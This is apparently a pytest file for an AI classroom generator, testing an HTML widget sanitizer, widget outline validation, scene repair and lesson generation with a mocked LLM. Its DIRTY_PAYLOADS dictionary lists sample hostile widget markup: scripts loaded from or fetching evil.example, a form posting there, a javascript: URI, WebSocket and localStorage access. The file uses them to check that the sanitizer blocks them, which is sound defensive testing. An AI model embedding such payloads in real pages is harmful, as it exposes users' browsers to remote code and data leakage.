"""T3 — interactive scenes: widgets, deterministic sanitizer, degradation."""

from __future__ import annotations

import json
from typing import Any

import pytest

from knorvia.services.classroom.generator import generate_classroom
from knorvia.services.classroom.models import (
    MAX_INTERACTIVE_SCENES,
    ClassroomDocument,
    SceneOutline,
    WidgetNode,
    WidgetOutline,
)
from knorvia.services.classroom.sanitize import sanitize_widget_html
from knorvia.services.classroom.store import ClassroomStore
from knorvia.services.classroom.styles import HANDS_ON
from knorvia.services.classroom.styles.base import OutlineConstraints
from knorvia.services.classroom.styles.verify import check_outline, repair


def _scripted(responses: list[str], monkeypatch, steps: list | None = None):
    async def fake_complete(prompt, system_prompt="", **kwargs):
        if len(responses) == 1:
            return responses[0]
        return responses.pop(0)

    import knorvia.services.llm

    monkeypatch.setattr(knorvia.services.llm, "complete", fake_complete)


CLEAN_WIDGET_HTML = (
    "<div><input id='v' type='range' min='1' max='10'>"
    "<canvas id='c'></canvas>"
    "<script>document.getElementById('v').oninput=function(){"
    "document.getElementById('c').width=+this.value*10;};</script></div>"
)

DIRTY_PAYLOADS = {
    "script-src": "<div><script src='https://evil.example/x.js'></script>ok</div>",
    "srcdoc-nesting": "<iframe srcdoc='<p>nested</p>'></iframe>",
    "javascript-uri": "<a href='javascript:alert(1)'>x</a>",
    "fetch-call": "<script>fetch('https://evil.example')</script>",
    "xmlhttprequest": "<script>new XMLHttpRequest()</script>",
    "websocket": "<script>new WebSocket('wss://x')</script>",
    "dynamic-import": "<script>import('https://evil.example')</script>",
    "window-top-parent": "<script>window.top.location='https://x';window.parent.</script>",
    "localstorage": "<script>localStorage.setItem('k','v')</script>",
    "form-action": "<form action='https://evil.example'><input></form>",
}


class TestSanitizer:
    def test_clean_html_passes_untouched(self):
        result = sanitize_widget_html(CLEAN_WIDGET_HTML)
        assert result.html == CLEAN_WIDGET_HTML
        assert result.hits == [] and result.degrade is False

    @pytest.mark.parametrize("name", sorted(DIRTY_PAYLOADS))
    def test_every_attack_is_neutralized(self, name):
        result = sanitize_widget_html(DIRTY_PAYLOADS[name])
        assert result.degrade or result.hits, f"{name} slipped through"
        assert DIRTY_PAYLOADS[name].strip() != result.html or result.degrade

    def test_strip_tier_keeps_widget_alive(self):
        html = "<form action='https://x'><input></form><script>localStorage.getItem('a');draw();</script>"
        result = sanitize_widget_html(html)
        assert result.degrade is False
        assert "action=" not in result.html
        assert "localStorage" not in result.html
        assert "draw();" in result.html  # the widget's own code survives
        assert set(result.hits) == {"form-action", "localstorage"}

    def test_document_tier_degrades_wholly(self):
        result = sanitize_widget_html("<p>hi</p><script src='//x'></script><p>bye</p>")
        assert result.degrade is True
        assert result.html == ""
        assert result.hits == ["script-src"]

    def test_empty_html_degrades(self):
        assert sanitize_widget_html("   ").degrade is True


class TestWidgetModel:
    def test_simulation_needs_two_variables_and_concept(self):
        widget = WidgetOutline(widget_type="simulation", concept="c", key_variables=["x"])
        assert any("key_variables" in p for p in widget.validate())
        widget.key_variables = ["x", "y"]
        assert any("concept" in p for p in WidgetOutline(widget_type="simulation", key_variables=["x", "y"]).validate())
        assert WidgetOutline(widget_type="simulation", concept="c", key_variables=["x", "y"]).validate() == []

    def test_diagram_needs_type_and_three_nodes(self):
        widget = WidgetOutline(widget_type="diagram", concept="c", diagram_type="flow", nodes=[])
        assert any(">= 3 nodes" in p for p in widget.validate())
        widget.nodes = [WidgetNode(id=f"n{i}", label=f"L{i}") for i in range(3)]
        assert widget.validate() == []

    def test_roundtrip_and_tolerant_from_dict(self):
        widget = WidgetOutline(
            widget_type="diagram",
            concept="递归调用树",
            diagram_type="hierarchy",
            nodes=[
                WidgetNode(id="n1", label="root"),
                WidgetNode(id="n2", label="left", parent_id="n1"),
                WidgetNode(id="n3", label="right", parent_id="n1"),
            ],
        )
        restored = WidgetOutline.from_dict(widget.to_dict())
        assert restored.validate() == []
        assert [n.id for n in restored.nodes] == ["n1", "n2", "n3"]
        # Nodes without ids get synthesized ids; garbage falls back sanely.
        bare = WidgetOutline.from_dict({"widget_type": "diagram", "concept": "c", "diagram_type": "flow", "nodes": [{"label": "a"}, {"label": "b"}, {"label": "c"}]})
        assert [n.id for n in bare.nodes] == ["n1", "n2", "n3"]


def _outline(stype: str, order: int, widget: dict | None = None) -> SceneOutline:
    data = {"id": f"s{order + 1}", "type": stype, "title": "场景", "key_points": ["p"], "order": order}
    if widget is not None:
        data["widget"] = widget
    return SceneOutline.from_dict(data)


SIM_WIDGET = {
    "widget_type": "simulation",
    "concept": "调整斜率看直线变化",
    "key_variables": ["斜率", "截距"],
}
DIAGRAM_WIDGET = {
    "widget_type": "diagram",
    "concept": "点击节点高亮调用路径",
    "diagram_type": "flow",
    "nodes": [{"label": "main"}, {"label": "helper"}, {"label": "base case"}],
}


class TestCheckOutlineInteractive:
    def test_interactive_without_widget_is_a_violation(self):
        outlines = [_outline("slide", 0), _outline("interactive", 1)]
        diagnostics = check_outline(outlines, HANDS_ON.constraints)
        assert any("no widget outline" in d for d in diagnostics)

    def test_invalid_widgets_are_flagged(self):
        bad_sim = {**SIM_WIDGET, "key_variables": ["斜率"]}
        bad_diagram = {**DIAGRAM_WIDGET, "nodes": [{"label": "a"}, {"label": "b"}]}
        diagnostics = check_outline(
            [_outline("interactive", 0, bad_sim), _outline("interactive", 1, bad_diagram)],
            HANDS_ON.constraints,
        )
        assert any("key_variables" in d for d in diagnostics)
        assert any(">= 3 nodes" in d for d in diagnostics)

    def test_over_budget_and_consecutive_interactive(self):
        outlines = [
            _outline("slide", 0),
            _outline("interactive", 1, SIM_WIDGET),
            _outline("interactive", 2, SIM_WIDGET),
            _outline("interactive", 3, DIAGRAM_WIDGET),
            _outline("slide", 4),
        ]
        diagnostics = check_outline(outlines, HANDS_ON.constraints)
        assert any(
            f"interactive count 3 above maximum {MAX_INTERACTIVE_SCENES}" in d
            for d in diagnostics
        )
        assert any("forbidden consecutive 'interactive'" in d for d in diagnostics)

    def test_valid_hands_on_outline_passes(self):
        outlines = [
            _outline("slide", 0),
            _outline("interactive", 1, SIM_WIDGET),
            _outline("quiz", 2),
            _outline("interactive", 3, DIAGRAM_WIDGET),
            _outline("slide", 4),
        ]
        assert check_outline(outlines, HANDS_ON.constraints) == []


class TestRepairInteractive:
    def test_over_budget_interactive_degrades_keeping_consecutive_rule(self):
        outlines = [
            _outline("interactive", 0, SIM_WIDGET),
            _outline("interactive", 1, SIM_WIDGET),
            _outline("interactive", 2, DIAGRAM_WIDGET),
            _outline("slide", 3),
            _outline("quiz", 4),
            _outline("slide", 5),
        ]
        repaired = repair(outlines, HANDS_ON.constraints)
        # 3rd interactive drops to the budget; the opening swap puts a slide
        # first; the consecutive twin (now at 1-2) degrades its later one.
        assert [o.type for o in repaired] == [
            "slide",
            "interactive",
            "slide",
            "slide",
            "quiz",
            "slide",
        ]
        assert check_outline(repaired, HANDS_ON.constraints) == []
        # widget data survives on the still-interactive scene
        assert repaired[1].widget.concept == "调整斜率看直线变化"


SCENE_SPEECH = json.dumps(
    {
        "title": "场景",
        "key_points": ["x"],
        "actions": [{"type": "speech", "agent_id": "teacher", "text": "讲解"}],
    }
)


def _interactive_scene_payload(html: str, narration: list[str]) -> str:
    return json.dumps(
        {
            "title": "互动",
            "key_points": ["动手"],
            "html": html,
            "narration": narration,
        },
        ensure_ascii=False,
    )


def _outlines_with_widgets() -> str:
    return json.dumps(
        {
            "title": "动手课",
            "outlines": [
                {"id": "s1", "type": "slide", "title": "开场", "key_points": ["x"]},
                {
                    "id": "s2",
                    "type": "interactive",
                    "title": "调参实验",
                    "key_points": ["动手"],
                    "widget": SIM_WIDGET,
                },
                {
                    "id": "s3",
                    "type": "interactive",
                    "title": "调用结构",
                    "key_points": ["结构"],
                    "widget": DIAGRAM_WIDGET,
                },
            ],
        },
        ensure_ascii=False,
    )


class TestInteractiveGeneration:
    @pytest.mark.asyncio
    async def test_lesson_with_two_interactive_scenes_roundtrips(
        self, tmp_path, monkeypatch
    ):
        _scripted(
            [
                _outlines_with_widgets(),
                json.dumps({"title": "开场", "key_points": ["x"], "actions": [{"type": "speech", "agent_id": "teacher", "text": "开始"}]}),
                _interactive_scene_payload(CLEAN_WIDGET_HTML, ["先拖动斜率", "再看截距"]),
                _interactive_scene_payload(CLEAN_WIDGET_HTML, ["点击任意节点"]),
            ],
            monkeypatch,
        )
        steps: list[tuple[str, dict[str, Any]]] = []

        async def on_progress(step, info):
            steps.append((step, info))

        document = await generate_classroom("T", on_progress=on_progress)
        types = [s.type for s in document.scenes]
        assert types == ["slide", "interactive", "interactive"]
        widget_scene = document.scenes[1]
        assert widget_scene.html == CLEAN_WIDGET_HTML
        assert widget_scene.widget is not None
        assert widget_scene.widget.key_variables == ["斜率", "截距"]
        assert widget_scene.narration == ["先拖动斜率", "再看截距"]
        # Narration became the teacher's spoken timeline.
        assert widget_scene.actions[0]["type"] == "speech"
        assert widget_scene.actions[0]["text"] == "先拖动斜率"
        assert not any(step == "scene_degraded" for step, _ in steps)
        # Persist + reload: the widget and html survive the roundtrip.
        store = ClassroomStore(root=tmp_path / "classrooms")
        store.save(document)
        loaded = store.get(document.id)
        assert loaded is not None
        reloaded = loaded.scenes[1]
        assert reloaded.type == "interactive" and reloaded.html == CLEAN_WIDGET_HTML
        assert reloaded.widget is not None and reloaded.widget.diagram_type == ""

    @pytest.mark.asyncio
    async def test_dirty_html_degrades_scene_not_lesson(self, monkeypatch):
        _scripted(
            [
                _outlines_with_widgets(),
                json.dumps({"title": "开场", "key_points": ["x"], "actions": [{"type": "speech", "agent_id": "teacher", "text": "开始"}]}),
                _interactive_scene_payload(
                    DIRTY_PAYLOADS["script-src"], ["旁白"]
                ),
                _interactive_scene_payload(CLEAN_WIDGET_HTML, ["点击节点"]),
            ],
            monkeypatch,
        )
        steps: list[tuple[str, dict[str, Any]]] = []

        async def on_progress(step, info):
            steps.append((step, info))

        document = await generate_classroom("T", on_progress=on_progress)
        degraded = [info for step, info in steps if step == "scene_degraded"]
        assert len(degraded) == 1
        assert degraded[0]["reason"] == "script-src"
        victim = document.scenes[1]
        # The slide keeps its title/key_points and the lesson still completes.
        assert victim.type == "slide"
        assert victim.title == "互动" and victim.key_points == ["动手"]
        assert victim.html == "" and victim.widget is None
        assert document.scenes[2].type == "interactive"
        assert [s.actions[0]["type"] for s in document.scenes] == ["speech"] * 3

    @pytest.mark.asyncio
    async def test_strip_tier_payload_survives_cleaned(self, monkeypatch):
        _scripted(
            [
                _outlines_with_widgets(),
                json.dumps({"title": "开场", "key_points": ["x"], "actions": [{"type": "speech", "agent_id": "teacher", "text": "开始"}]}),
                _interactive_scene_payload(
                    "<script>localStorage.getItem('x');" + "draw();" + "</script>",
                    ["旁白"],
                ),
                _interactive_scene_payload(CLEAN_WIDGET_HTML, ["点击节点"]),
            ],
            monkeypatch,
        )
        steps: list[tuple[str, dict[str, Any]]] = []

        async def on_progress(step, info):
            steps.append((step, info))

        document = await generate_classroom("T", on_progress=on_progress)
        assert not any(step == "scene_degraded" for step, _ in steps)
        scene = document.scenes[1]
        assert scene.type == "interactive"
        assert "localStorage" not in scene.html
        assert "draw();" in scene.html


class TestLegacyCompat:
    def test_old_lessons_without_interactive_read_back(self, tmp_path):
        legacy = ClassroomDocument.from_dict(
            {
                "id": "old",
                "title": "t",
                "topic": "t",
                "scenes": [
                    {"id": "s1", "type": "slide", "title": "A", "key_points": ["x"]}
                ],
                "outlines": [{"id": "s1", "type": "slide", "title": "A"}],
            }
        )
        assert legacy.scenes[0].html == ""
        assert legacy.scenes[0].widget is None
        assert legacy.outlines[0].widget is None
        store = ClassroomStore(root=tmp_path / "c")
        store.save(legacy)
        loaded = store.get("old")
        assert loaded is not None and loaded.scenes[0].type == "slide"
